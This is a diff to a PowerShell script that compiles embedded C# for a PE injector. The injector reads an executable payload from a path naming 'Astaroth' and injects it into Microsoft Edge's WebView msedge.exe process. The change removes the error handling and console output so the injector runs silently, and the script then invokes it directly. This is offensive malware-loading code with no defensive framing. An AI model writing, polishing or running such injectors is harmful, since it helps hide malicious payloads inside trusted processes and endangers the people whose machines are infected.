@@ -1,7 +1,6 @@
 $csharpCode = @"
 using System;
 using System.IO;
-using System.Net.Http;
 using System.Runtime.InteropServices;
 
 namespace PEx64_Injector
@@ -114,46 +113,15 @@ namespace PEx64_Injector
     {
         public static void Run()
         {
-            // IMPORTANT: Replace these paths with your actual payload and target process
             string payload = @"D:\Source Codes\10\IMPORTANTTTTT\Astaroth\x64\Release\WexizeRevamp.exe";
-
             string migratefile = @"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.139\msedge.exe";
             string arguments = "";
-
-            byte[] payloadData;
-            try
-            {
-                payloadData = File.ReadAllBytes(payload);
-            }
-            catch (FileNotFoundException)
-            {
-                Console.WriteLine($"Error: Payload file not found at {payload}");
-                return;
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Error reading payload file: {ex.Message}");
-                return;
-            }
-
-            try
-            {
-                Migrate.Load(payloadData, migratefile, arguments);
-                Console.WriteLine("Injection successful!");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Injection failed: {ex.Message}");
-            }
+            byte[] payloadData = File.ReadAllBytes(payload);
+            Migrate.Load(payloadData, migratefile, arguments);
         }
     }
 }
-"
+"@
 
-# Compile the C# code in PowerShell (unsafe code requires special handling)
-Add-Type -TypeDefinition $csharpCode -Language CSharp -ReferencedAssemblies "System.Net.Http.dll" -Unsafe
-
-# Execute the injector
+Add-Type -TypeDefinition $csharpCode -Language CSharp
 [PEx64_Injector.Injector]::Run()
-
-Write-Host "PowerShell script execution complete."
